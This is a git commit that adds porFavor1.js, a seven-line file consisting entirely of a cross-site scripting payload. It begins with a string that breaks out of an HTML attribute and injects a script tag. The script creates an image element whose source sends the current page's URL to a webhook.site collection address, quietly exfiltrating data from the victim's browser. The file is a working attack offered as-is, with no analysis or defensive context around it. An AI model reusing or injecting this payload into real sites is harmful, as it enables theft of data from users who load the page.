caa0ccdf916455da6b77637b4e0a2543ab7f249c
ambordokan <91415607+ambordokan@users.noreply.github.com>
2023-02-01 22:37:50 -0500

    Create porFavor1.js

---
+++ porFavor1.js
@@ -0,0 +1,7 @@
+"'/><script>
+// our payload grabs the URL value of
+// the current page
+  var img = document.createElement("img");
+  img.src="https://webhook.site/f2389c08-2b24-48e5-9d77-e31e000ac011/a.png?data="+window.location.href;
+  document.body.appendChild(img); 
+</script>
